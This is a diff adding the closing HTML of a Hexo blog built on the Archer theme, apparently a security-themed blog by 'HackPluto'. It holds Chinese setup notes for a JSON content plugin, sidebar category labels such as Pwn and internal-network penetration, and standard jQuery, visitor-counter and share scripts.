+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="ACM"><span class="iconfont-archer">&#xe60a;</span>ACM</span>
+    
+        <span class="sidebar-category-name" data-categories="Pwn"><span class="iconfont-archer">&#xe60a;</span>Pwn</span>
+    
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
+        <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
+    
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
+        <span class="sidebar-category-name" data-categories="Rust"><span class="iconfont-archer">&#xe60a;</span>Rust</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="社工"><span class="iconfont-archer">&#xe60a;</span>社工</span>
+    
+        <span class="sidebar-category-name" data-categories="BlackHatTools"><span class="iconfont-archer">&#xe60a;</span>BlackHatTools</span>
+    
+        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
+    
+        <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "HackPluto"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
